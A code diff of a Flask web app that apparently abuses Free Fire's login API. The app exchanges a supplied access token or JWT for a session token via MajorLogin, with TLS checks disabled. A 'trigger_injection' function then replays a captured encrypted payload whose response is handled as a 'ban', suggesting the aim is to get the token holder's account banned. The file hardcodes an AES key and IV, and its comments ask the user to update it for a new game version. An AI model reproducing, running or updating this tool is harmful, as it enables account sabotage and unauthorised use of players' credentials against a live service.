@@ -1,5 +1,4 @@
 import os
-import sys
 import json
 import base64
 import requests
@@ -23,23 +22,25 @@ except ImportError:
 
 app = Flask(__name__)
 
-# ============================================================
-#  🚨  UPDATE THESE FOR YOUR TARGET VERSION (e.g., OB54)  🚨
-# ============================================================
+# ================================================================
+#  🚨  UPDATE THESE THREE CONSTANTS FOR OB54  🚨
+# ================================================================
 
-# 1️⃣ Client version (from MajorLogin protobuf)
-CLIENT_VERSION = "1.120.1"                # <-- change to OB54 (e.g., "1.121.1")
-CLIENT_VERSION_CODE = "2019118695"        # <-- change to OB54 code
-
-# 2️⃣ The encrypted payload sent to /GetLoginData (base64 string)
-#    You MUST capture this from the official client.
+# 1. The encrypted payload sent to /GetLoginData (base64 string)
+#    You MUST capture this from the official OB54 client.
 BODY_BASE64 = (
     'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUibievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
-)   # <--- REPLACE with your OB54 payload
+)   # <--- replace with your OB54 payload
 
-# ============================================================
+# 2. Client version (from MajorLogin protobuf)
+CLIENT_VERSION = "1.120.1"          # <--- update to OB54 (e.g., "1.121.1")
 
-# Other constants (unchanged)
+# 3. Client version code (from MajorLogin protobuf)
+CLIENT_VERSION_CODE = "2019118695"  # <--- update to OB54 code
+
+# ================================================================
+
+# Other constants (do not change)
 AeSkEy = b'Yg&tc%DEuh6%Zc^8'
 AeSiV  = b'6oyZDr22E3ychjM%'
 mLuRl  = "https://loginbp.ggpolarbear.com/MajorLogin"
@@ -55,7 +56,7 @@ mLhDr  = {
     "ReleaseVersion": "OB54"   # will be overridden by JWT's version
 }
 
-# ---------- Helper functions (copied from your CLI script) ----------
+# ---------- Helper functions (from your CLI script) ----------
 
 def decode_ff_name(b64_str):
     try:
@@ -127,7 +128,7 @@ def decode_jwt(token):
         return {}
 
 def get_base_url(lock_region):
-    """Returns the appropriate base client URL based on the account's lock region."""
+    """Returns the correct client domain based on lock_region."""
     lock_region = lock_region.upper()
     ind_regions = ["IND"]
     us_regions = ["BR", "US", "NA", "SAC"]
@@ -139,10 +140,39 @@ def get_base_url(lock_region):
         return "https://clientbp.ggpolarbear.com"
 
 def fetch_majorlogin_jwt(tok):
-    """Return (jwt_token, error_message)"""
+    """
+    Attempts to get a fresh JWT via MajorLogin.
+    If input is a JWT, it uses it directly (after trying to extract open_id).
+    Returns (jwt_token, error_message).
+    """
+    # If it already looks like a JWT, just use it (but still try to get open_id)
     if tok.startswith("ey") and "." in tok:
+        # Try to extract open_id from JWT (for MajorLogin fallback)
+        try:
+            payload = decode_jwt(tok)
+            open_id = payload.get("open_id") or payload.get("account_id") or payload.get("sub")
+            if open_id:
+                # Try MajorLogin with this JWT as access_token
+                for p_type in [8, 3, 4, 6]:
+                    pl = build_majorlogin(tok, open_id, p_type)
+                    try:
+                        x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=10, verify=False)
+                        if x.status_code == 200:
+                            res = mLrPb.MajorLoginRes()
+                            try:
+                                res.ParseFromString(dec(x.content))
+                            except:
+                                res.ParseFromString(x.content)
+                            if res.token:
+                                return res.token, None
+                    except:
+                        continue
+        except:
+            pass
+        # Fallback: use the JWT directly
         return tok, None
 
+    # Not a JWT – try to get open_id from various APIs
     oId = None
     try:
         r = requests.get(
@@ -179,8 +209,8 @@ def fetch_majorlogin_jwt(tok):
     if not oId:
         return None, "Failed to extract Open ID. Token invalid or expired."
 
-    platforms = [8, 3, 4, 6]
-    for p_type in platforms:
+    # Try MajorLogin with each platform type
+    for p_type in [8, 3, 4, 6]:
         pl = build_majorlogin(tok, oId, p_type)
         try:
             x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=10, verify=False)
@@ -211,7 +241,7 @@ def trigger_injection(jwt_token, version, base_url):
     body = base64.b64decode(BODY_BASE64)
     return requests.post(api_url, headers=headers, data=body, timeout=20, verify=False)
 
-# ---------- HTML template (embedded) ----------
+# ---------- HTML template ----------
 PAGE_TEMPLATE = '''
 <!DOCTYPE html>
 <html>
@@ -424,7 +454,7 @@ def index():
             'version': '—'
         })
 
-    # Step 1: Authentication
+    # Step 1: Authentication (always try MajorLogin, fallback to JWT)
     jwt_token, err = fetch_majorlogin_jwt(token)
     if not jwt_token:
         return render_template_string(PAGE_TEMPLATE, result={
@@ -460,7 +490,6 @@ def index():
             'version': version
         })
 
-    # Build result
     if ban_resp.status_code == 200:
         result = {
             'success': True,
@@ -478,11 +507,10 @@ def index():
             'account_id': account_id,
             'region': region,
             'version': version,
-            'response_text': ban_resp.text[:500]  # show first 500 chars
+            'response_text': ban_resp.text[:500]
         }
 
     return render_template_string(PAGE_TEMPLATE, result=result)
 
-# For local testing
 if __name__ == '__main__':
     app.run(debug=True)
